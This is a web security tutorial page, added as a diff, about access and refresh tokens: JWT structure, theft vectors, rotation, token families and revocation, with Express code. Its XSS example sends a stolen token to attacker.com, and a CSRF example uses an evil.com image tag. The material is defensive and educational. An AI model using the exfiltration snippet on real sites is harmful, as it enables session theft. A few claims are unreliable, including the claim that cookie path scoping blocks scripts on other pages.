@@ -1,0 +1,1269 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Access Tokens vs Refresh Tokens: Security Deep Dive | Learning Hub</title>
+    <link rel="stylesheet" href="../styles.css" />
+    <script src="../read-state.js" defer></script>
+    <script src="../highlight.js" defer></script>
+    <script src="../chat-widget.js" defer></script>
+  </head>
+  <body>
+    <main class="page container">
+      <header class="page-header">
+        <a class="back-link" href="../index.html">← Back to Learning Hub</a>
+
+        <figure class="article-hero">
+          <img
+            class="article-hero-img"
+            src="https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=1600&h=700&fit=crop&auto=format&q=80"
+            alt="Lock and key on a dark circuit board"
+            loading="lazy"
+          />
+          <div class="article-hero-overlay"></div>
+          <div class="article-hero-content">
+            <span class="article-hero-kicker">Security · Auth · JavaScript · Deep Dive · 35 min</span>
+            <p class="article-hero-credit">
+              Photo by
+              <a href="https://unsplash.com/@flyd2069" target="_blank" rel="noopener">FLY:D</a>
+              on <a href="https://unsplash.com" target="_blank" rel="noopener">Unsplash</a>
+            </p>
+          </div>
+        </figure>
+
+        <h1>Access Tokens vs Refresh Tokens: Security Deep Dive</h1>
+        <p class="summary">
+          Why two tokens exist, exactly how each is stolen, the attack vectors that exploit
+          refresh tokens specifically, and every meaningful defence — rotation, families, revocation,
+          and storage strategies. Full JavaScript implementations throughout.
+        </p>
+        <div class="article-meta">
+          <div>
+            <span class="meta-label">Focus</span>
+            <span class="meta-value">Token architecture, attack patterns, defences, JS code</span>
+          </div>
+          <div>
+            <span class="meta-label">Tech</span>
+            <span class="meta-value">Node.js, JWT, Express, HTTP-only cookies</span>
+          </div>
+          <div>
+            <span class="meta-label">Published</span>
+            <span class="meta-value">Jun 28, 2026</span>
+          </div>
+          <div>
+            <span class="meta-label">Level</span>
+            <span class="meta-value">Intermediate → Senior</span>
+          </div>
+        </div>
+      </header>
+
+      <!-- ─── INTRO ─────────────────────────────────────────────────────────── -->
+      <section class="content-card">
+        <p class="lead">
+          Most auth bugs are not in the login flow — they are in what happens after login. Access
+          tokens and refresh tokens solve a real tension: <em>convenience vs security</em>. The
+          access token makes every API call fast and stateless. The refresh token quietly extends the
+          session so the user never has to log in again. Both tokens carry enormous value to an
+          attacker, but they are stolen in different ways and defended with completely different
+          techniques.
+        </p>
+        <div class="callout">
+          <p>
+            <strong>The core insight to hold throughout this guide:</strong> access tokens are
+            designed to be used constantly but expire quickly. Refresh tokens are designed to be
+            used rarely but last a long time. Every security decision follows from that asymmetry.
+          </p>
+        </div>
+        <p>
+          This guide covers the full picture: the architecture, the attack surface, and the defences
+          — with working JavaScript code at every step so you can see exactly what each pattern
+          looks like in practice.
+        </p>
+      </section>
+
+      <!-- ─── SECTION 1 ─────────────────────────────────────────────────────── -->
+      <section class="content-card">
+        <span class="section-label">Section 1</span>
+        <h2>Why two tokens? The fundamental problem</h2>
+
+        <p>
+          The naive solution to authentication is to issue one long-lived token on login. The user
+          stores it, sends it with every request, and the server validates it. Simple — but two
+          catastrophic properties:
+        </p>
+        <ul>
+          <li><strong>If the token is stolen, the attacker has access until the token expires.</strong> With a 90-day token, that is a 90-day compromise.</li>
+          <li><strong>To revoke access you need server state.</strong> The moment you check a revocation database on every request, you have given up stateless authentication and paid the performance cost without the benefit.</li>
+        </ul>
+
+        <p>The two-token model is the resolution:</p>
+
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>Property</th>
+              <th>Access Token</th>
+              <th>Refresh Token</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr><td>Typical lifetime</td><td>5–30 minutes</td><td>7–90 days</td></tr>
+            <tr><td>Sent to</td><td>Every API endpoint</td><td>Only the <code>/auth/refresh</code> endpoint</td></tr>
+            <tr><td>Validated by</td><td>Stateless (JWT signature)</td><td>Stateful (database lookup)</td></tr>
+            <tr><td>Revocable immediately</td><td>No (until expiry)</td><td>Yes (delete from DB)</td></tr>
+            <tr><td>If stolen, window of damage</td><td>Minutes</td><td>Days — but see rotation</td></tr>
+            <tr><td>Stored where (recommended)</td><td>Memory only</td><td>HTTP-only cookie</td></tr>
+            <tr><td>Volume of use</td><td>Every request (hundreds/day)</td><td>Once per access-token expiry</td></tr>
+          </tbody>
+        </table>
+
+        <p class="mini-heading">The flow at a glance</p>
+        <pre><code class="language-text">1. User logs in with credentials
+   └── Server issues: [access token (15 min)] + [refresh token (30 days)]
+
+2. Client stores access token in memory, refresh token in HTTP-only cookie
+
+3. Client calls API with access token in Authorization header
+   └── Server validates JWT signature — no database hit needed
+
+4. Access token expires after 15 min
+   └── Client calls POST /auth/refresh (sends refresh token via cookie)
+   └── Server validates refresh token against database
+   └── Server issues new access token + new refresh token (rotation)
+   └── Client stores new access token in memory
+
+5. User logs out
+   └── Server deletes refresh token from database
+   └── Client clears memory (access token gone)
+   └── Effect: even if someone has the old refresh token, it is now invalid</code></pre>
+
+        <div class="callout callout--warn">
+          <p>
+            <strong>The key insight about revocation:</strong> you cannot revoke an access token
+            before it expires. That is a conscious tradeoff — the short lifetime limits the damage
+            window. Revocation happens at the refresh token layer. When you delete a refresh token,
+            the user cannot get new access tokens and effectively loses access the moment the
+            current access token expires (within minutes).
+          </p>
+        </div>
+      </section>
+
+      <!-- ─── SECTION 2 ─────────────────────────────────────────────────────── -->
+      <section class="content-card">
+        <span class="section-label">Section 2</span>
+        <h2>JWT anatomy — what is actually inside each token</h2>
+
+        <p>
+          Both tokens in modern systems are typically JWTs (JSON Web Tokens). Understanding the
+          structure tells you exactly what an attacker gets if they steal one.
+        </p>
+
+        <p>
+          A JWT has three base64url-encoded parts separated by dots:
+          <code>header.payload.signature</code>
+        </p>
+
+        <pre><code class="language-js">// Install: npm install jsonwebtoken
+import jwt from 'jsonwebtoken';
+
+const ACCESS_SECRET  = process.env.ACCESS_TOKEN_SECRET;   // 256-bit random
+const REFRESH_SECRET = process.env.REFRESH_TOKEN_SECRET;  // different 256-bit random
+
+// ── Issue tokens ──────────────────────────────────────────────────────────────
+
+function issueAccessToken(userId, roles) {
+  return jwt.sign(
+    {
+      sub:   userId,          // subject — who this token is for
+      roles: roles,           // what the user can do
+      type:  'access',        // prevents a refresh token being used as access
+      iss:   'api.myapp.com', // issuer — who issued this token
+      aud:   'myapp-client',  // audience — who should accept it
+    },
+    ACCESS_SECRET,
+    {
+      expiresIn: '15m',       // access token: short-lived
+      algorithm: 'HS256',
+    }
+  );
+}
+
+function issueRefreshToken(userId, tokenFamily) {
+  return jwt.sign(
+    {
+      sub:    userId,
+      type:   'refresh',      // explicit type prevents cross-use
+      family: tokenFamily,    // used for rotation attack detection (see Section 5)
+    },
+    REFRESH_SECRET,
+    {
+      expiresIn: '30d',       // refresh token: long-lived
+      algorithm: 'HS256',
+    }
+  );
+}
+
+// ── Decode (without verifying) to inspect the payload ─────────────────────────
+
+const accessToken = issueAccessToken('user123', ['read', 'write']);
+const decoded = jwt.decode(accessToken);
+
+console.log(decoded);
+// {
+//   sub: 'user123',
+//   roles: ['read', 'write'],
+//   type: 'access',
+//   iss: 'api.myapp.com',
+//   aud: 'myapp-client',
+//   iat: 1719532800,   // issued at (Unix timestamp)
+//   exp: 1719533700    // expires at (iat + 900 seconds = 15 min)
+// }
+
+// ── Verify and extract claims ──────────────────────────────────────────────────
+
+function verifyAccessToken(token) {
+  try {
+    return jwt.verify(token, ACCESS_SECRET, {
+      issuer:   'api.myapp.com',
+      audience: 'myapp-client',
+    });
+  } catch (err) {
+    // jwt.TokenExpiredError, jwt.JsonWebTokenError, jwt.NotBeforeError
+    throw new Error('Invalid or expired access token');
+  }
+}</code></pre>
+
+        <div class="callout">
+          <p>
+            <strong>Critical:</strong> use <em>different secrets</em> for access and refresh tokens.
+            If you use the same secret, a leaked refresh token could be presented as an access
+            token (and vice versa) on a server that does not check the <code>type</code> claim.
+            The <code>type</code> claim is a second line of defence — the different secret is the
+            first.
+          </p>
+        </div>
+
+        <p class="mini-heading">What an attacker gets from each token</p>
+        <table class="data-table">
+          <thead>
+            <tr><th>Stolen token</th><th>What attacker can do</th><th>Window</th></tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Access token</td>
+              <td>Call any API endpoint as that user until expiry</td>
+              <td>Up to 15 minutes</td>
+            </tr>
+            <tr>
+              <td>Refresh token (no rotation)</td>
+              <td>Generate unlimited new access tokens indefinitely</td>
+              <td>30 days (or until logout)</td>
+            </tr>
+            <tr>
+              <td>Refresh token (with rotation)</td>
+              <td>Generate one new access token — then the theft is detectable</td>
+              <td>One rotation cycle</td>
+            </tr>
+          </tbody>
+        </table>
+      </section>
+
+      <!-- ─── SECTION 3 ─────────────────────────────────────────────────────── -->
+      <section class="content-card">
+        <span class="section-label">Section 3</span>
+        <h2>How attackers steal access tokens</h2>
+
+        <p>
+          Access tokens are high-frequency targets. They travel in HTTP headers on every single API
+          call. There are four primary attack vectors.
+        </p>
+
+        <p class="mini-heading">Attack 1: XSS (Cross-Site Scripting)</p>
+        <p>
+          If your access token lives in <code>localStorage</code> or any JavaScript-accessible
+          variable, an XSS injection can steal it directly:
+        </p>
+
+        <pre><code class="language-js">// ─────────────────────────────────────────────────────────────────────────────
+// ATTACKER CODE injected via XSS (e.g. via a malicious npm package,
+// a stored XSS in a comment field, or a compromised CDN script)
+// ─────────────────────────────────────────────────────────────────────────────
+
+// If access token is in localStorage (DANGEROUS pattern):
+const stolenToken = localStorage.getItem('access_token');
+
+// Send it silently to the attacker's server
+fetch('https://attacker.com/collect', {
+  method: 'POST',
+  body: JSON.stringify({ token: stolenToken }),
+  mode: 'no-cors',   // bypasses CORS, exfiltration still succeeds
+});
+
+// ─────────────────────────────────────────────────────────────────────────────
+// DEFENCE: never store access tokens in localStorage or sessionStorage.
+// Store access tokens in a JavaScript variable (module-scope memory).
+// XSS cannot read variables outside its own execution context
+// if your app uses strict CSP. The token disappears on page refresh —
+// that is intentional. A new one is obtained via the refresh token.
+// ─────────────────────────────────────────────────────────────────────────────
+
+// Safe pattern — access token lives only in memory:
+let _accessToken = null;  // module-level, never persisted to storage
+
+export function setAccessToken(token) { _accessToken = token; }
+export function getAccessToken()      { return _accessToken; }
+export function clearAccessToken()    { _accessToken = null; }</code></pre>
+
+        <p class="mini-heading">Attack 2: Network interception (Man-in-the-Middle)</p>
+        <p>
+          On unencrypted connections, access tokens in HTTP headers are visible in plaintext.
+          Defence is absolute: <strong>HTTPS everywhere, no exceptions.</strong>
+          Include an <code>HTTP Strict-Transport-Security</code> header to prevent downgrade attacks.
+        </p>
+
+        <pre><code class="language-js">// Express: enforce HTTPS and HSTS
+import helmet from 'helmet';
+
+app.use(helmet({
+  hsts: {
+    maxAge:            31_536_000, // 1 year in seconds
+    includeSubDomains: true,
+    preload:           true,
+  },
+}));
+
+// Redirect HTTP → HTTPS at the load balancer / reverse-proxy level.
+// Never let plaintext HTTP reach your app server.</code></pre>
+
+        <p class="mini-heading">Attack 3: Token leakage via Referer header</p>
+        <p>
+          If someone makes the mistake of putting a token in a URL query parameter
+          (<code>/api/data?token=eyJ...</code>), the full URL including the token appears in server
+          logs, browser history, and the <code>Referer</code> header of any outbound link the
+          user clicks. This is how entire auth systems have been compromised from log files.
+        </p>
+
+        <pre><code class="language-js">// NEVER do this:
+// GET /api/users?access_token=eyJhbGci...
+
+// ALWAYS use the Authorization header:
+const response = await fetch('/api/users', {
+  headers: {
+    'Authorization': `Bearer ${getAccessToken()}`,
+    'Content-Type':  'application/json',
+  },
+});
+
+// The Authorization header is:
+// ✓ Not logged by most proxies by default
+// ✓ Not included in the Referer header
+// ✓ Not stored in browser history
+// ✓ Stripped by browsers on cross-origin redirects</code></pre>
+
+        <p class="mini-heading">Attack 4: Shoulder surfing / DevTools exposure</p>
+        <p>
+          Any attacker with physical access or a shared screen can open DevTools → Application →
+          Local Storage and copy tokens stored there. Memory-only tokens are gone when the tab
+          is closed and cannot be found in DevTools storage panels.
+        </p>
+      </section>
+
+      <!-- ─── SECTION 4 ─────────────────────────────────────────────────────── -->
+      <section class="content-card">
+        <span class="section-label">Section 4</span>
+        <h2>How attackers steal refresh tokens</h2>
+
+        <p>
+          Refresh tokens are higher-value targets than access tokens. Steal one and you get a
+          renewable supply of access tokens. The attack surface is different because refresh tokens
+          should travel much less frequently.
+        </p>
+
+        <p class="mini-heading">Attack 1: XSS on refresh tokens stored in localStorage</p>
+        <p>
+          Same vector as access tokens — if the refresh token is in any JavaScript-accessible
+          storage, XSS steals it. <strong>The fix is HTTP-only cookies.</strong>
+        </p>
+
+        <pre><code class="language-js">// ─── SERVER: set the refresh token as an HTTP-only cookie ──────────────────
+
+import express from 'express';
+import cookieParser from 'cookie-parser';
+
+const app = express();
+app.use(cookieParser());
+
+app.post('/auth/login', async (req, res) => {
+  const { email, password } = req.body;
+  const user = await validateCredentials(email, password);
+  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
+
+  const accessToken  = issueAccessToken(user.id, user.roles);
+  const refreshToken = issueRefreshToken(user.id, generateFamily());
+
+  // Store refresh token hash in database
+  await db.refreshTokens.create({
+    userId:    user.id,
+    tokenHash: hashToken(refreshToken),  // never store the raw token
+    family:    decodeFamily(refreshToken),
+    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
+  });
+
+  // ── The critical settings for the cookie ─────────────────────────────────
+  res.cookie('refresh_token', refreshToken, {
+    httpOnly: true,   // JavaScript CANNOT read this cookie. XSS proof.
+    secure:   true,   // Only sent over HTTPS. Never over HTTP.
+    sameSite: 'strict', // Not sent on cross-site requests. CSRF proof.
+    path:     '/auth/refresh', // Only sent to this specific endpoint.
+    maxAge:   30 * 24 * 60 * 60 * 1000, // 30 days in ms
+  });
+
+  // Access token goes in the response body — client stores it in memory
+  res.json({ accessToken });
+});
+
+// ─── CLIENT: the refresh token cookie is INVISIBLE to JavaScript ──────────
+
+// This is what the client receives:
+// {
+//   "accessToken": "eyJhbGci..."
+// }
+//
+// The refresh_token cookie is attached to the response and stored
+// by the browser automatically. JavaScript cannot access it.
+// document.cookie will NOT show it. localStorage.getItem won't find it.
+// An XSS payload cannot steal it.</code></pre>
+
+        <div class="callout callout--warn">
+          <p>
+            <strong>The storage tradeoff:</strong> HTTP-only cookies protect against XSS but
+            introduce CSRF risk. <code>sameSite: 'strict'</code> (or <code>'lax'</code>) is your
+            CSRF defence. Use <code>'strict'</code> if your refresh endpoint is never navigated to
+            from an external link. Use <code>'lax'</code> if you need top-level navigation to work.
+            Never use <code>'none'</code> without a specific reason and additional CSRF token.
+          </p>
+        </div>
+
+        <p class="mini-heading">Attack 2: CSRF against the refresh endpoint</p>
+        <p>
+          CSRF (Cross-Site Request Forgery) tricks the user's browser into sending a request to
+          your server from an attacker's page. Cookies (including HTTP-only ones) are sent
+          automatically by the browser — so a malicious page could trigger <code>POST /auth/refresh</code>
+          and receive a new access token.
+        </p>
+
+        <pre><code class="language-js">// ─── ATTACK: what a CSRF attempt looks like ──────────────────────────────────
+
+// Attacker's page (evil.com) contains:
+// &lt;img src="https://api.myapp.com/auth/refresh" /&gt;
+// ... the browser sends the refresh_token cookie automatically!
+
+// ─── DEFENCE 1: sameSite=strict ──────────────────────────────────────────────
+// Already set above. Browsers will NOT attach cookies on cross-site requests
+// when sameSite is 'strict'. The above &lt;img&gt; tag gets no cookie.
+
+// ─── DEFENCE 2: CSRF token (double-submit cookie pattern) ────────────────────
+// For scenarios where sameSite alone is not enough (e.g. older browsers):
+
+app.post('/auth/refresh', (req, res) => {
+  // Expect a CSRF token in the request header that matches a non-httpOnly cookie
+  const csrfTokenFromHeader = req.headers['x-csrf-token'];
+  const csrfTokenFromCookie = req.cookies['csrf_token']; // NOT http-only
+
+  if (!csrfTokenFromHeader || csrfTokenFromHeader !== csrfTokenFromCookie) {
+    return res.status(403).json({ error: 'CSRF validation failed' });
+  }
+
+  // Proceed with refresh...
+});
+
+// ─── DEFENCE 3: check the Origin header ──────────────────────────────────────
+
+app.post('/auth/refresh', (req, res) => {
+  const origin = req.headers['origin'];
+  const allowedOrigins = ['https://myapp.com', 'https://app.myapp.com'];
+
+  if (!allowedOrigins.includes(origin)) {
+    return res.status(403).json({ error: 'Origin not allowed' });
+  }
+  // Proceed...
+});</code></pre>
+
+        <p class="mini-heading">Attack 3: Token exfiltration via subdomain or third-party scripts</p>
+        <p>
+          If a malicious script runs on any page of your domain (e.g. a compromised analytics
+          script), it cannot read HTTP-only cookies — but it can make a fetch call to your
+          <code>/auth/refresh</code> endpoint. The browser attaches the cookie automatically.
+          The response contains a new access token. That access token <em>is</em> readable by
+          JavaScript. The attacker now has an access token without ever seeing the refresh token.
+        </p>
+        <p>
+          This is why <code>path: '/auth/refresh'</code> is important — it limits cookie scope to
+          that exact path so a script on <code>/blog</code> cannot trigger it — and why you should
+          implement anomaly detection on refresh cadence (more on this in Section 6).
+        </p>
+      </section>
+
+      <!-- ─── SECTION 5 ─────────────────────────────────────────────────────── -->
+      <section class="content-card">
+        <span class="section-label">Section 5</span>
+        <h2>Refresh token rotation and token families</h2>
+
+        <p>
+          This is the most important defence for refresh tokens. Without rotation, stealing one
+          refresh token grants perpetual access. With rotation, the theft is detectable — and
+          triggers automatic session termination.
+        </p>
+
+        <p class="mini-heading">Rotation: the basic rule</p>
+        <p>
+          Every time a refresh token is used, it is invalidated and a new one is issued.
+          The client must store the new one for next time.
+        </p>
+
+        <pre><code class="language-js">// ─── SERVER: /auth/refresh endpoint with token rotation ──────────────────────
+
+import crypto from 'crypto';
+
+function hashToken(token) {
+  return crypto.createHash('sha256').update(token).digest('hex');
+}
+
+app.post('/auth/refresh', async (req, res) => {
+  const incomingRefreshToken = req.cookies.refresh_token;
+  if (!incomingRefreshToken) {
+    return res.status(401).json({ error: 'No refresh token' });
+  }
+
+  // 1. Verify the JWT signature and extract claims
+  let claims;
+  try {
+    claims = jwt.verify(incomingRefreshToken, REFRESH_SECRET);
+  } catch {
+    return res.status(401).json({ error: 'Invalid refresh token' });
+  }
+
+  // 2. Look up the token in the database by hash
+  const tokenHash = hashToken(incomingRefreshToken);
+  const stored = await db.refreshTokens.findOne({ tokenHash });
+
+  if (!stored) {
+    // Token not found. Either already used (rotation attack!) or never existed.
+    // This is handled by the family logic below.
+    return res.status(401).json({ error: 'Refresh token not found or already used' });
+  }
+
+  // 3. Issue new tokens (ROTATION: invalidate the old one)
+  const newAccessToken  = issueAccessToken(claims.sub, stored.roles);
+  const newRefreshToken = issueRefreshToken(claims.sub, claims.family); // same family
+
+  // 4. Replace old refresh token with new one in database
+  await db.refreshTokens.delete({ tokenHash });          // invalidate old
+  await db.refreshTokens.create({                         // store new
+    userId:    claims.sub,
+    tokenHash: hashToken(newRefreshToken),
+    family:    claims.family,
+    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
+  });
+
+  // 5. Set the new refresh token cookie
+  res.cookie('refresh_token', newRefreshToken, {
+    httpOnly: true, secure: true, sameSite: 'strict', path: '/auth/refresh',
+    maxAge: 30 * 24 * 60 * 60 * 1000,
+  });
+
+  res.json({ accessToken: newAccessToken });
+});</code></pre>
+
+        <div class="callout">
+          <p>
+            <strong>Why store the hash instead of the raw token?</strong> If your database is
+            breached, the attacker gets hashes — not usable tokens. SHA-256 is fast enough
+            for single-token lookups and sufficient because refresh tokens are already random
+            (high entropy), making rainbow tables useless.
+          </p>
+        </div>
+
+        <p class="mini-heading">Token families: detecting reuse attacks</p>
+        <p>
+          Rotation alone is not enough. Consider this scenario: attacker steals a refresh token.
+          Legitimate user uses it first — gets a new one, old one is deleted. Attacker now
+          uses the stolen (old) token — it is not in the database, so the request is rejected.
+          Good. But what if the attacker uses it <em>first</em>? They get a new access token and
+          a new refresh token. Now the legitimate user tries to refresh — their token is gone.
+          They are silently logged out with no warning.
+        </p>
+        <p>
+          Token families solve this: every refresh token belongs to a family (a UUID generated
+          at login). If a stolen-and-rotated token is ever presented, the server detects reuse
+          within that family and kills <em>all tokens in the entire family</em>.
+        </p>
+
+        <pre><code class="language-js">// ─── Refresh token family: reuse detection ───────────────────────────────────
+
+function generateFamily() {
+  return crypto.randomUUID(); // generated once at login, shared by all rotations
+}
+
+app.post('/auth/refresh', async (req, res) => {
+  const incomingToken = req.cookies.refresh_token;
+  let claims;
+
+  try {
+    claims = jwt.verify(incomingToken, REFRESH_SECRET);
+  } catch {
+    return res.status(401).json({ error: 'Invalid token' });
+  }
+
+  const tokenHash = hashToken(incomingToken);
+  const stored    = await db.refreshTokens.findOne({ tokenHash });
+
+  if (!stored) {
+    // ─── REUSE DETECTED ──────────────────────────────────────────────────────
+    // This token was already consumed in a previous rotation.
+    // Someone is replaying an old token — likely an attacker who stole it.
+    // The correct response: REVOKE THE ENTIRE FAMILY immediately.
+
+    console.warn(`Refresh token reuse detected. Family: ${claims.family}, User: ${claims.sub}`);
+
+    // Kill all tokens in this family — legitimate user and attacker both lose access.
+    // The legitimate user will have to re-authenticate. That is the right tradeoff.
+    await db.refreshTokens.deleteAll({ family: claims.family });
+
+    // Optionally: email the user "We detected suspicious activity on your account"
+    await notifyUserOfSuspiciousActivity(claims.sub);
+
+    return res.status(401).json({
+      error: 'Refresh token reuse detected. All sessions have been terminated for security.'
+    });
+  }
+
+  // Normal rotation path (no reuse detected)...
+  const newAccessToken  = issueAccessToken(claims.sub, stored.roles);
+  const newRefreshToken = issueRefreshToken(claims.sub, claims.family); // preserve family
+
+  await db.refreshTokens.delete({ tokenHash });
+  await db.refreshTokens.create({
+    userId:    claims.sub,
+    tokenHash: hashToken(newRefreshToken),
+    family:    claims.family,
+    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
+  });
+
+  res.cookie('refresh_token', newRefreshToken, {
+    httpOnly: true, secure: true, sameSite: 'strict', path: '/auth/refresh',
+    maxAge: 30 * 24 * 60 * 60 * 1000,
+  });
+
+  res.json({ accessToken: newAccessToken });
+});</code></pre>
+
+        <p class="mini-heading">The family attack detection timeline</p>
+        <pre><code class="language-text">T=0   User logs in.  Family ID: f-abc. Token RT-1 stored in DB.
+T=5   Attacker steals RT-1 (e.g. via XSS before HTTP-only was in place).
+T=10  Attacker uses RT-1 → gets RT-2 + new access token. RT-1 deleted from DB.
+T=15  Legitimate user tries to refresh with RT-1 (they still have it).
+      RT-1 not found in DB.
+      Family f-abc: server finds RT-2 in DB, knows family f-abc has been used after deletion.
+      → SERVER KILLS entire family f-abc (deletes RT-2).
+      → ATTACKER loses their RT-2 on next use.
+      → Both parties must re-authenticate.
+      → Security team is alerted. User is notified.</code></pre>
+      </section>
+
+      <!-- ─── SECTION 6 ─────────────────────────────────────────────────────── -->
+      <section class="content-card">
+        <span class="section-label">Section 6</span>
+        <h2>The client-side refresh flow — silent token renewal</h2>
+
+        <p>
+          The client needs to detect when the access token is about to expire and get a new one
+          silently, without the user noticing. This is the "silent refresh" pattern.
+        </p>
+
+        <pre><code class="language-js">// ─── auth.js — client-side token manager ─────────────────────────────────────
+
+let _accessToken     = null;
+let _refreshPromise  = null;  // prevents race conditions (see below)
+
+// Parse JWT expiry without a library (browser-safe)
+function getTokenExpiry(token) {
+  const payload = JSON.parse(atob(token.split('.')[1]));
+  return payload.exp * 1000; // convert seconds → milliseconds
+}
+
+function isTokenExpiringSoon(token, bufferMs = 60_000) {
+  // Returns true if token expires within the next 60 seconds
+  return getTokenExpiry(token) - Date.now() < bufferMs;
+}
+
+// ─── Core fetch wrapper: automatically refreshes before sending ───────────────
+
+export async function apiFetch(url, options = {}) {
+  // Refresh if expired or expiring within 60 seconds
+  if (!_accessToken || isTokenExpiringSoon(_accessToken)) {
+    await refreshAccessToken();
+  }
+
+  const response = await fetch(url, {
+    ...options,
+    headers: {
+      ...options.headers,
+      'Authorization': `Bearer ${_accessToken}`,
+      'Content-Type':  'application/json',
+    },
+  });
+
+  // Handle the case where the server returns 401 despite our refresh
+  // (e.g. the access token was revoked server-side, or clock skew)
+  if (response.status === 401) {
+    const retried = await retryAfterRefresh(url, options);
+    if (!retried) redirectToLogin();
+    return retried;
+  }
+
+  return response;
+}
+
+// ─── Silent refresh (deduplication prevents race conditions) ─────────────────
+
+async function refreshAccessToken() {
+  // If a refresh is already in flight, wait for that one instead of
+  // sending multiple parallel refresh requests
+  if (_refreshPromise) {
+    return _refreshPromise;
+  }
+
+  _refreshPromise = (async () => {
+    try {
+      const res = await fetch('/auth/refresh', {
+        method:      'POST',
+        credentials: 'include', // sends the refresh_token HTTP-only cookie
+        headers:     { 'Content-Type': 'application/json' },
+      });
+
+      if (!res.ok) {
+        // Refresh failed — session is dead, send user to login
+        _accessToken = null;
+        redirectToLogin();
+        return;
+      }
+
+      const { accessToken } = await res.json();
+      _accessToken = accessToken; // store ONLY in memory
+    } finally {
+      _refreshPromise = null; // clear so future refreshes can proceed
+    }
+  })();
+
+  return _refreshPromise;
+}
+
+async function retryAfterRefresh(url, options) {
+  await refreshAccessToken();
+  if (!_accessToken) return null;
+
+  return fetch(url, {
+    ...options,
+    headers: {
+      ...options.headers,
+      'Authorization': `Bearer ${_accessToken}`,
+      'Content-Type':  'application/json',
+    },
+  });
+}
+
+function redirectToLogin() {
+  _accessToken = null;
+  window.location.href = '/login';
+}
+
+// ─── Usage in your app ────────────────────────────────────────────────────────
+
+// All your API calls go through apiFetch instead of raw fetch
+const users = await apiFetch('/api/users');
+const data  = await apiFetch('/api/orders/123', { method: 'GET' });</code></pre>
+
+        <div class="callout">
+          <p>
+            <strong>The deduplication pattern matters.</strong> Without the <code>_refreshPromise</code>
+            guard, if three API calls fire at the same time and all find an expired token, you get
+            three simultaneous refresh requests. Server rotates the token three times. First response
+            wins. Second and third responses return tokens that are already invalid. Two requests
+            fail with 401. This is a real production bug — the single-promise guard prevents it.
+          </p>
+        </div>
+      </section>
+
+      <!-- ─── SECTION 7 ─────────────────────────────────────────────────────── -->
+      <section class="content-card">
+        <span class="section-label">Section 7</span>
+        <h2>Token revocation: logout and force-logout</h2>
+
+        <p>
+          Logout must actively revoke the refresh token. Clearing it from the client cookie
+          is not enough — the token still exists in a database and an attacker who already
+          copied it could still use it.
+        </p>
+
+        <pre><code class="language-js">// ─── SERVER: logout endpoint ──────────────────────────────────────────────────
+
+app.post('/auth/logout', async (req, res) => {
+  const refreshToken = req.cookies.refresh_token;
+
+  if (refreshToken) {
+    // Validate it belongs to who they claim to be (optional but good practice)
+    try {
+      const claims  = jwt.verify(refreshToken, REFRESH_SECRET);
+      const tokenHash = hashToken(refreshToken);
+
+      // Option 1: Delete just this token (single-device logout)
+      await db.refreshTokens.delete({ tokenHash });
+
+      // Option 2: Delete the entire family (all devices sharing this session chain)
+      // await db.refreshTokens.deleteAll({ family: claims.family });
+
+      // Option 3: Delete ALL tokens for this user (logout everywhere)
+      // await db.refreshTokens.deleteAll({ userId: claims.sub });
+
+    } catch {
+      // Token was invalid or already expired — still clear the cookie
+    }
+  }
+
+  // Clear the cookie on the client
+  res.clearCookie('refresh_token', {
+    httpOnly: true, secure: true, sameSite: 'strict', path: '/auth/refresh',
+  });
+
+  res.json({ message: 'Logged out successfully' });
+});
+
+// ─── SERVER: force-logout a user (admin or security response) ─────────────────
+
+app.post('/admin/force-logout/:userId', requireAdminAuth, async (req, res) => {
+  const { userId } = req.params;
+
+  // Delete ALL refresh tokens for this user across all devices
+  const deleted = await db.refreshTokens.deleteAll({ userId });
+  console.log(`Force-logged out user ${userId}. Removed ${deleted.count} sessions.`);
+
+  // The user's current access token (in memory) will expire within 15 min.
+  // After that, every refresh attempt returns 401. User is fully locked out.
+
+  res.json({
+    message: `All sessions for user ${userId} have been terminated.`,
+    sessionsRemoved: deleted.count,
+  });
+});
+
+// ─── CLIENT: logout ───────────────────────────────────────────────────────────
+
+async function logout() {
+  await apiFetch('/auth/logout', { method: 'POST' });
+  _accessToken = null;          // clear memory
+  window.location.href = '/login';
+}</code></pre>
+
+        <p class="mini-heading">The database schema for refresh tokens</p>
+        <pre><code class="language-js">// Postgres schema (using pg or any ORM)
+// CREATE TABLE refresh_tokens (
+//   id          UUID         PRIMARY KEY DEFAULT gen_random_uuid(),
+//   user_id     VARCHAR(255) NOT NULL,
+//   token_hash  VARCHAR(64)  NOT NULL UNIQUE,  -- SHA-256 hex = 64 chars
+//   family      UUID         NOT NULL,
+//   roles       TEXT[]       NOT NULL,
+//   created_at  TIMESTAMPTZ  NOT NULL DEFAULT now(),
+//   expires_at  TIMESTAMPTZ  NOT NULL,
+//   last_used   TIMESTAMPTZ,
+//   ip_address  INET,
+//   user_agent  TEXT
+// );
+//
+// CREATE INDEX idx_rt_user_id    ON refresh_tokens (user_id);
+// CREATE INDEX idx_rt_family     ON refresh_tokens (family);
+// CREATE INDEX idx_rt_expires_at ON refresh_tokens (expires_at);
+// -- Note: token_hash already has a UNIQUE index (fast lookup by hash)
+
+// Regularly clean up expired tokens (cron job or DB TTL extension):
+async function cleanupExpiredTokens() {
+  const result = await db.query(
+    'DELETE FROM refresh_tokens WHERE expires_at &lt; NOW()'
+  );
+  console.log(`Cleaned up ${result.rowCount} expired refresh tokens`);
+}</code></pre>
+      </section>
+
+      <!-- ─── SECTION 8 ─────────────────────────────────────────────────────── -->
+      <section class="content-card">
+        <span class="section-label">Section 8</span>
+        <h2>Server-side access token validation middleware</h2>
+
+        <p>
+          Every protected API route runs through this middleware. It validates the JWT signature,
+          checks claims, and rejects anything suspicious — all without a database hit.
+        </p>
+
+        <pre><code class="language-js">// ─── authMiddleware.js ────────────────────────────────────────────────────────
+
+export function requireAuth(req, res, next) {
+  const authHeader = req.headers.authorization;
+
+  if (!authHeader || !authHeader.startsWith('Bearer ')) {
+    return res.status(401).json({ error: 'Missing or malformed Authorization header' });
+  }
+
